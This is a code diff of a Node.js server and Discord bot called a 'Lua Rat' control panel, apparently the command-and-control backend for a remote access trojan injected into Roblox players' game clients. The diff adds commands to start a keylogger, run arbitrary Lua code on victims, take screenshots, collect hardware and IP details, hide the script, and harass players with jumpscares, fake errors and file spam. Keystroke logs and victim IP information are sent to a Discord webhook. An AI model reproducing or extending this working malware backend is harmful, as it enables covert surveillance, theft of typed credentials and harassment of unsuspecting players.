@@ -3,16 +3,15 @@ const fetch = require('node-fetch');
 const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const cors = require('cors');
 
-// ========== КОНФИГУРАЦИЯ (всё из переменных окружения) ==========
+// ========== КОНФИГУРАЦИЯ ==========
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const PORT = process.env.PORT || 10000;
 
-// SERVER_URL теперь динамический
 const SERVER_URL = process.env.RENDER_EXTERNAL_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` || `http://localhost:${PORT}`;
 
-console.log('🚀 RAT Control Server v3.2 запускается...');
-console.log('🔧 Конфигурация:');
+console.log('Lua Rat Server v3.2 запускается...');
+console.log('Конфигурация:');
 console.log(`- PORT: ${PORT}`);
 console.log(`- SERVER_URL: ${SERVER_URL}`);
 console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅' : '❌'}`);
@@ -30,7 +29,7 @@ function isRateLimited(ip, playerName) {
         const lastRequest = rateLimitMap.get(ip);
         if (now - lastRequest < 30000) {
             if (now - lastSpamWarning > 10000) {
-                console.log(`⚠️ Спам: IP ${ip}`);
+                console.log(`Спам: IP ${ip}`);
                 lastSpamWarning = now;
             }
             return true;
@@ -40,7 +39,7 @@ function isRateLimited(ip, playerName) {
     if (recentInjects.has(playerName)) {
         const lastInject = recentInjects.get(playerName);
         if (now - lastInject < 60000) {
-            console.log(`⚠️ ${playerName} уже инжектился`);
+            console.log(`${playerName} уже инжектился`);
             return true;
         }
     }
@@ -74,7 +73,7 @@ app.use(express.urlencoded({ extended: true }));
 // ========== DISCORD ВЕБХУК ==========
 async function sendDiscordWebhook(title, description, color = 0x3498db, fields = []) {
     if (!WEBHOOK_URL) {
-        console.log('⚠️ WEBHOOK_URL не настроен');
+        console.log('WEBHOOK_URL не настроен');
         return false;
     }
     
@@ -85,25 +84,25 @@ async function sendDiscordWebhook(title, description, color = 0x3498db, fields =
             color: color,
             fields: fields,
             timestamp: new Date().toISOString(),
-            footer: { text: "RAT Control System v3.2" }
+            footer: { text: "Lua Rat System v3.2" }
         };
         
         const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
-                username: "RAT Control",
+                username: "Lua Rat System",
                 embeds: [embed]
             })
         });
         
         if (response.ok) {
-            console.log(`✅ Вебхук: ${title}`);
+            console.log(`Вебхук: ${title}`);
             return true;
         }
         return false;
     } catch (error) {
-        console.error('❌ Ошибка вебхука:', error.message);
+        console.error('Ошибка вебхука:', error.message);
         return false;
     }
 }
@@ -159,10 +158,10 @@ if (DISCORD_TOKEN) {
                 body: JSON.stringify(payload)
             });
             
-            console.log(`📨 Команда ${command} -> ${target || 'всем'}`);
+            console.log(`Команда ${command} -> ${target || 'всем'}`);
             return response.ok;
         } catch (error) {
-            console.error(`❌ Ошибка: ${error.message}`);
+            console.error(`Ошибка: ${error.message}`);
             return false;
         }
     }
@@ -178,8 +177,8 @@ if (DISCORD_TOKEN) {
     }
 
     discordClient.on('ready', () => {
-        console.log(`🤖 Бот ${discordClient.user.tag} запущен!`);
-        discordClient.user.setActivity('/help | RAT v3.2', { type: 'WATCHING' });
+        console.log(`Бот ${discordClient.user.tag} запущен!`);
+        discordClient.user.setActivity('/help | Lua Rat v3.2', { type: 'WATCHING' });
     });
 
     discordClient.on('messageCreate', async message => {
@@ -188,62 +187,328 @@ if (DISCORD_TOKEN) {
         const { command, args, target } = parseCommandWithTarget(message);
         
         const handlers = {
-            test: async () => {
-                if (await sendCommand("popup", ["✅ Тест от бота!"], target)) {
-                    message.reply(`✅ Тест отправлен ${target ? `игроку ${target}` : 'всем'}`);
-                }
-            },
+            // ========== ИНФОРМАЦИОННЫЕ КОМАНДЫ ==========
             users: async () => {
                 const data = await getOnlineUsers();
                 const embed = new EmbedBuilder()
-                    .setTitle('👥 Онлайн')
-                    .setColor(0x00ff00)
-                    .setDescription(data.count > 0 ? 
-                        data.users.map(u => `• ${u.player} - ${u.place || 'Unknown'}`).join('\n') : 
-                        '❌ Нет игроков');
-                message.reply({ embeds: [embed] });
+                    .setTitle('👥 Онлайн пользователи')
+                    .setColor(0x00ff00);
+                
+                if (data.count > 0) {
+                    embed.setDescription(`**Всего онлайн:** ${data.count}`);
+                    const userList = data.users.slice(0, 15).map(u => 
+                        `• **${u.player}** - ${u.place || 'Unknown'} (${u.executor || 'Unknown'})`
+                    ).join('\n');
+                    embed.addFields({ name: 'Список игроков:', value: userList + (data.users.length > 15 ? `\n\n... и еще ${data.users.length - 15}` : '') });
+                } else {
+                    embed.setDescription('❌ Нет активных игроков');
+                    embed.setColor(0xff0000);
+                }
+                await message.reply({ embeds: [embed] });
             },
+            
             status: async () => {
                 const embed = new EmbedBuilder()
-                    .setTitle('📊 Статус')
+                    .setTitle('📊 Статус системы')
                     .setColor(0x7289da)
                     .addFields(
-                        { name: '👥 Онлайн', value: `${global.onlineUsers.size}`, inline: true },
-                        { name: '📨 Очередь', value: `${commandQueue.length}`, inline: true },
-                        { name: '🤖 Бот', value: '🟢 Активен', inline: true }
+                        { name: '👥 Онлайн игроков', value: `${global.onlineUsers.size}`, inline: true },
+                        { name: '📨 Очередь команд', value: `${commandQueue.length}`, inline: true },
+                        { name: '🤖 Discord бот', value: '🟢 Активен', inline: true },
+                        { name: '📊 Версия', value: '`3.2.0`', inline: true },
+                        { name: '🛡️ Защита', value: 'Rate Limited', inline: true }
                     );
-                message.reply({ embeds: [embed] });
+                await message.reply({ embeds: [embed] });
             },
+            
+            test: async () => {
+                if (await sendCommand("popup", ["Тест от Discord бота! ✅"], target)) {
+                    await message.reply(`✅ Тест отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                } else {
+                    await message.reply('❌ Ошибка отправки');
+                }
+            },
+            
+            print: async () => {
+                if (await sendCommand("print", [], target)) {
+                    await message.reply(`📡 Проверка связи отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                } else {
+                    await message.reply('❌ Ошибка');
+                }
+            },
+            
+            // ========== УПРАВЛЕНИЕ ИГРОКОМ ==========
+            kick: async () => {
+                const reason = args.join(' ') || 'Нарушение правил';
+                if (await sendCommand("kick", [reason], target)) {
+                    await message.reply(`🦶 Кик отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}\nПричина: ${reason}`);
+                }
+            },
+            
+            freeze: async () => {
+                let seconds = parseInt(args[0]) || 5;
+                seconds = Math.min(seconds, 60);
+                if (await sendCommand("freeze", [seconds], target)) {
+                    await message.reply(`❄️ Заморозка отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\nДлительность: ${seconds} сек`);
+                }
+            },
+            
+            void: async () => {
+                if (await sendCommand("void", [], target)) {
+                    await message.reply(`🌀 Телепорт в бездну отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                }
+            },
+            
+            spin: async () => {
+                if (await sendCommand("spin", [], target)) {
+                    await message.reply(`🔄 Вращение отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                }
+            },
+            
+            fling: async () => {
+                if (await sendCommand("fling", [], target)) {
+                    await message.reply(`🚀 Подбрасывание отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                }
+            },
+            
+            sit: async () => {
+                if (await sendCommand("sit", [], target)) {
+                    await message.reply(`🪑 Смена позы отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                }
+            },
+            
+            dance: async () => {
+                if (await sendCommand("dance", [], target)) {
+                    await message.reply(`💃 Танец отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
+                }
+            },
+            
+            cameralock: async () => {
+                const action = args[0] || "toggle";
+                if (await sendCommand("cameralock", [action], target)) {
+                    await message.reply(`🎥 Блокировка камеры отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\nДействие: ${action}`);
+                }
+            },
+            
+            camerashake: async () => {
+                let duration = parseInt(args[0]) || 5;
+                let intensity = parseInt(args[1]) || 2;
+                duration = Math.min(duration, 30);
+                intensity = Math.min(intensity, 10);
+                if (await sendCommand("camerashake", [duration, intensity], target)) {
+                    await message.reply(`📷 Тряска камеры отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\nДлительность: ${duration} сек | Интенсивность: ${intensity}`);
+                }
+            },
+            
+            tpgame: async () => {
+                const placeId = args[0];
+                if (!placeId || !/^\d+$/.test(placeId)) {
+                    await message.reply('❌ Укажите корректный ID места (только цифры)');
+                    return;
+                }
+                if (await sendCommand("tpgame", [placeId], target)) {
+                    await message.reply(`🌀 Телепорт в игру отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}\nID места: ${placeId}`);
+                }
+            },
+            
+            // ========== АУДИО/ВИДЕО ==========
+            mute: async () => {
+                if (await sendCommand("mute", [], target)) {
+                    await message.reply(`🔇 Звуки выключены ${target ? `для **${target}**` : '**для всех игроков**'}`);
+                }
+            },
+            
+            unmute: async () => {
+                if (await sendCommand("unmute", [], target)) {
+                    await message.reply(`🔊 Звуки включены ${target ? `для **${target}**` : '**для всех игроков**'}`);
+                }
+            },
+            
+            playaudio: async () => {
+                const audioId = args[0] || "184702873";
+                if (await sendCommand("playaudio", [audioId], target)) {
+                    await message.reply(`🔊 Аудио отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}\nID: ${audioId}`);
+                }
+            },
+            
+            blur: async () => {
+                let seconds = parseInt(args[0]) || 5;
+                seconds = Math.min(seconds, 30);
+                if (await sendCommand("blur", [seconds], target)) {
+                    await message.reply(`🔵 Размытие экрана отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}\nДлительность: ${seconds} сек`);
+                }
+            },
+            
+            screenshot: async () => {
+                if (await sendCommand("screenshot", [], target)) {
+                    await message.reply(`📸 Скриншот запрошен ${target ? `у **${target}**` : '**у всех игроков**'}\nРезультат будет через 5 секунд`);
+                }
+            },
+            
+            // ========== ЧАТ ==========
+            chat: async () => {
+                if (await sendCommand("chat", [], target)) {
+                    await message.reply(`💬 Чат ${target ? `у **${target}**` : '**у всех игроков**'} переключен`);
+                }
+            },
+            
+            message: async () => {
+                const text = args.join(' ');
+                if (!text) {
+                    await message.reply('❌ Укажите текст сообщения');
+                    return;
+                }
+                if (text.length > 100) {
+                    await message.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
+                    return;
+                }
+                if (await sendCommand("popup", [text], target)) {
+                    await message.reply(`📩 Сообщение отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}\nТекст: ${text}`);
+                }
+            },
+            
+            // ========== СКРИМЕРЫ ==========
+            jumpscare: async () => {
+                let scareType = parseInt(args[0]) || 1;
+                if (scareType < 1 || scareType > 2) scareType = 1;
+                const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
+                const name = scareNames[scareType];
+                if (await sendCommand("jumpscare", [scareType], target)) {
+                    await message.reply(`👻 Скример ${name} запущен ${target ? `для **${target}**` : '**для всех игроков**'}`);
+                }
+            },
+            
+            // ========== СИСТЕМНЫЕ ==========
+            execute: async () => {
+                const code = args.join(' ');
+                if (!code) {
+                    await message.reply('❌ Укажите код для выполнения');
+                    return;
+                }
+                if (code.length > 500) {
+                    await message.reply('❌ Код слишком длинный (макс. 500 символов)');
+                    return;
+                }
+                if (await sendCommand("execute", [code], target)) {
+                    await message.reply(`🔧 Код отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}\n\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``);
+                }
+            },
+            
+            fakeerror: async () => {
+                const errorText = args.join(' ') || 'Системная ошибка';
+                if (await sendCommand("fakeerror", [errorText], target)) {
+                    await message.reply(`⚠️ Фейковая ошибка отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\nСообщение: ${errorText}`);
+                }
+            },
+            
+            keylog: async () => {
+                if (await sendCommand("keylog", [], target)) {
+                    await message.reply(`⌨️ Кейлоггер активирован ${target ? `для **${target}**` : '**для всех игроков**'}\nЛоги будут приходить каждые 5 минут`);
+                }
+            },
+            
+            stopkeylog: async () => {
+                if (await sendCommand("stopkeylog", [], target)) {
+                    await message.reply(`🛑 Кейлоггер деактивирован ${target ? `для **${target}**` : '**для всех игроков**'}`);
+                }
+            },
+            
+            hardware: async () => {
+                if (await sendCommand("hardware", [], target)) {
+                    await message.reply(`🖥️ Данные об оборудовании запрошены ${target ? `у **${target}**` : '**у всех игроков**'}`);
+                }
+            },
+            
+            hide: async () => {
+                if (await sendCommand("hide", [], target)) {
+                    await message.reply(`👻 Скрытие скрипта выполнено ${target ? `для **${target}**` : '**для всех игроков**'}`);
+                }
+            },
+            
+            // ========== SPAM ==========
+            memory: async () => {
+                let fileCount = parseInt(args[0]) || 100;
+                fileCount = Math.min(fileCount, 1000);
+                if (await sendCommand("memory_spam", [fileCount], target)) {
+                    await message.reply(`💾 Memory Spam запущен ${target ? `для **${target}**` : '**для всех игроков**'}\nКоличество файлов: ${fileCount}`);
+                }
+            },
+            
+            gallery: async () => {
+                let imageCount = parseInt(args[0]) || 10;
+                imageCount = Math.min(imageCount, 50);
+                if (await sendCommand("gallery_spam", [imageCount], target)) {
+                    await message.reply(`🖼️ Gallery Spam запущен ${target ? `для **${target}**` : '**для всех игроков**'}\nКоличество файлов: ${imageCount}`);
+                }
+            },
+            
+            // ========== HELP ==========
             help: async () => {
                 const embed = new EmbedBuilder()
-                    .setTitle('🤖 RAT Control v3.2')
-                    .setDescription('**Доступные команды:**\n`/users` - Онлайн\n`/status` - Статус\n`/test` - Тест\n`/kick [ник] [причина]` - Кик\n`/freeze [ник] [сек]` - Заморозка\n`/void [ник]` - В бездну\n`/jumpscare [ник] [1-2]` - Скример\n`/message [ник] [текст]` - Сообщение\n`/execute [ник] [код]` - Lua код')
-                    .setColor(0x7289da);
-                message.reply({ embeds: [embed] });
-            },
-            default: async () => {
-                const validCommands = ['kick', 'freeze', 'void', 'jumpscare', 'message', 'execute', 'fakeerror', 'blur', 'mute', 'unmute', 'playaudio', 'spin', 'fling', 'sit', 'dance', 'cameralock', 'camerashake', 'keylog', 'stopkeylog', 'hardware', 'hide', 'memory', 'gallery', 'screenshot', 'print', 'tpgame', 'chat'];
+                    .setTitle('Lua Rat Panel v3.2')
+                    .setDescription('**Полный список всех команд с поддержкой таргетинга**')
+                    .setColor(0x7289da)
+                    .addFields(
+                        { 
+                            name: '🎯 Формат команд:', 
+                            value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами\n\n**Примеры:**\n`/fakeerror текст` - для всех\n`/fakeerror PlayerName текст` - для игрока\n`/cameralock on` - для всех\n`/cameralock PlayerName off` - для игрока', 
+                            inline: false 
+                        },
+                        { 
+                            name: '👤 Управление игроком (10 команд)', 
+                            value: '`/tpgame [ник] <id места>`\n`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '🔊 Аудио/Видео (5 команд)', 
+                            value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <секунды>`\n`/screenshot [ник]`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '💬 Чат (2 команды)', 
+                            value: '`/chat [ник]`\n`/message [ник] <текст>`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '👻 Скримеры (1 команда)', 
+                            value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe', 
+                            inline: false 
+                        },
+                        { 
+                            name: '⚙️ Системные (6 команд)', 
+                            value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '💥 Spam (2 команды)', 
+                            value: '`/memory [ник] <кол-во>`\n`/gallery [ник] <кол-во>`', 
+                            inline: false 
+                        },
+                        { 
+                            name: '👥 Информация (4 команды)', 
+                            value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
+                            inline: false 
+                        }
+                    )
+                    .setFooter({ text: `Всего команд: 28 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
                 
-                if (validCommands.includes(command)) {
-                    if (await sendCommand(command, args, target)) {
-                        message.reply(`✅ ${command} отправлена ${target ? target : 'всем'}`);
-                    }
-                } else if (command) {
-                    message.reply(`❌ Неизвестная команда. Используй /help`);
-                }
+                await message.reply({ embeds: [embed] });
             }
         };
         
         try {
-            if (handlers[command]) await handlers[command]();
-            else await handlers.default();
+            if (handlers[command]) {
+                await handlers[command]();
+            } else if (command) {
+                await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
+            }
         } catch (error) {
             console.error(error);
-            message.reply('❌ Ошибка');
+            await message.reply('❌ Ошибка выполнения команды');
         }
     });
 
-    discordClient.login(DISCORD_TOKEN).catch(e => console.error('❌ Ошибка бота:', e.message));
+    discordClient.login(DISCORD_TOKEN).catch(e => console.error('Ошибка бота:', e.message));
 }
 
 // ========== API МАРШРУТЫ ==========
@@ -261,7 +526,7 @@ app.get('/data', (req, res) => {
     if (commandIndex !== -1) {
         const cmd = commandQueue[commandIndex];
         commandQueue.splice(commandIndex, 1);
-        console.log(`📨 ${cmd.command} -> ${player}`);
+        console.log(`${cmd.command} -> ${player}`);
         res.json({ command: cmd.command, args: cmd.args || [] });
     } else {
         res.json({ command: "", args: [] });
@@ -272,7 +537,6 @@ app.post('/command', async (req, res) => {
     const { command, args, target } = req.body;
     const clientIp = req.ip || req.connection.remoteAddress;
     
-    // Инжект уведомление
     if (command === "inject_notify" && args && args.length >= 5) {
         const playerName = args[0];
         
@@ -286,14 +550,13 @@ app.post('/command', async (req, res) => {
         
         const [_, gameName, ipInfo, executor, device] = args;
         
-        const description = `**Игрок:** ${playerName}\n**Игра:** ${gameName || "Unknown"}\n**Инжектор:** ${executor || "Unknown"}\n**Устройство:** ${device || "PC"}\n\n**IP:**\n${ipInfo || "N/A"}`;
+        const description = `**Игрок:** ${playerName}\n**Игра:** ${gameName || "Unknown"}\n**Инжектор:** ${executor || "Unknown"}\n**Устройство:** ${device || "PC"}\n\n**IP информация:**\n${ipInfo || "N/A"}`;
         
-        await sendDiscordWebhook("🔌 Новый инжект!", description, 0x00ff00);
+        await sendDiscordWebhook("Новый инжект!", description, 0x00ff00);
         
         return res.json({ status: "OK" });
     }
     
-    // Обычные команды
     if (command && command !== "inject_notify") {
         commandQueue.push({
             command: command,
@@ -351,7 +614,7 @@ app.get('/screenshot', (req, res) => {
 app.post('/keylog', async (req, res) => {
     const { logs } = req.body;
     if (logs && logs.length > 0) {
-        await sendDiscordWebhook("⌨️ Кейлоггер", `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
+        await sendDiscordWebhook("Кейлоггер", `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
     }
     res.json({ status: "OK" });
 });
@@ -359,7 +622,7 @@ app.post('/keylog', async (req, res) => {
 app.post('/hardware', async (req, res) => {
     const { player, data } = req.body;
     if (player && data) {
-        await sendDiscordWebhook("💻 Hardware Info", `**Игрок:** ${player}\n**FPS:** ${data.fps || 0}\n**Пинг:** ${data.ping || 0}\n**Экзекутор:** ${data.executor || "Unknown"}`, 0x9b59b6);
+        await sendDiscordWebhook("Hardware Info", `**Игрок:** ${player}\n**FPS:** ${data.fps || 0}\n**Пинг:** ${data.ping || 0}\n**Экзекутор:** ${data.executor || "Unknown"}`, 0x9b59b6);
     }
     res.json({ status: "OK" });
 });
@@ -385,7 +648,7 @@ app.get('/health', (req, res) => {
 
 app.get('/', (req, res) => {
     res.json({
-        name: "RAT Control System",
+        name: "Lua Rat Control System",
         version: "3.2.0",
         status: "operational",
         endpoints: ["/data", "/command", "/users", "/status", "/health"]
@@ -393,8 +656,8 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`\n🚀 Сервер запущен на ${PORT}`);
-    console.log(`🌐 URL: ${SERVER_URL}`);
-    console.log(`🤖 Discord: ${DISCORD_TOKEN ? '✅' : '❌'}`);
-    console.log(`🔗 Webhook: ${WEBHOOK_URL ? '✅' : '❌'}\n`);
+    console.log(`\nСервер запущен на ${PORT}`);
+    console.log(`URL: ${SERVER_URL}`);
+    console.log(`Discord: ${DISCORD_TOKEN ? '✅' : '❌'}`);
+    console.log(`Webhook: ${WEBHOOK_URL ? '✅' : '❌'}\n`);
 });
